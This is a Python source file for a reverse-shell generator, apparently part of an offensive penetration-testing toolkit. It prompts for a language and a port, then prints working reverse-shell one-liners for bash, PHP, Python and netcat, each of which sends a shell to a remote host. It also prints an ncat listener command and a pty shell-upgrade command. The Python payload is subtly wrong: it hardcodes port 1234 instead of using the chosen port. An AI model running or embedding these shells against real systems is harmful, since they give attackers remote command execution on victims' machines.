from Colors import Colors


class ReverseShellGenerator:
    def generate(self):
        userResp = input(f"{Colors.GRAY}[?] Generate reverse shell [Y/N]? {Colors.YELLOW}").upper()
        if userResp != 'Y' and userResp != 'N' or len(userResp) == 0:
            print(f"{Colors.YELLOW}[!] Do not generate reverse shell{Colors.DEFAULT}")
        elif userResp == 'Y' or userResp == "YES" or userResp == 'S' or userResp == "SIM":
            print(f"{Colors.PURPLE}[*] Trying reverse shell generator{Colors.DEFAULT}")
            
            try:
                language = input(f"{Colors.CIAN}[#] Provide a language/platform for reverse shell: {Colors.YELLOW}").upper()
                port = int(input(f"{Colors.CIAN}[#] Provide a high port for reverse shell: {Colors.YELLOW}"))
            
                langDict = {
                    "BASH":f"sh -i >& /dev/tcp/<receiving host>/{port} 0>&1",
                    "PHP":f"php -r '$sock=fsockopen(\"<receiving host>\",{port});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
                    "PYTHON":f"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"<receiving host>\",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",
                    "NETCAT":f"nc -e /bin/sh <receiving host> {port}",
                }
            
                langExist = False
                for lang, reverseShell in langDict.items():
                    if language == lang:
                        langExist = True
                        print(f"{Colors.GREEN}[+]\t{Colors.DEFAULT}payload:\t{Colors.GREEN}{reverseShell}{Colors.DEFAULT}")
                
                if langExist == False:
                    print(f"{Colors.YELLOW}[!] Language/platform doesn't exist{Colors.YELLOW}")
                else:
                    print(f"{Colors.GREEN}[+]\t{Colors.DEFAULT}listener:\t{Colors.GREEN}ncat -lvnp {port}{Colors.DEFAULT}")
                    print(f"{Colors.GREEN}[+]\t{Colors.DEFAULT}spawn tty:\t{Colors.GREEN}python -c 'import pty;pty.spawn(\"/bin/bash\")'{Colors.DEFAULT}")
                
            except Exception as error:
                print(f"{Colors.YELLOW}[!] Unexpected error when generating reverse shell: {error}{Colors.YELLOW}")            
        else:
            print(f"{Colors.YELLOW}[!] Do not generate reverse shell{Colors.DEFAULT}")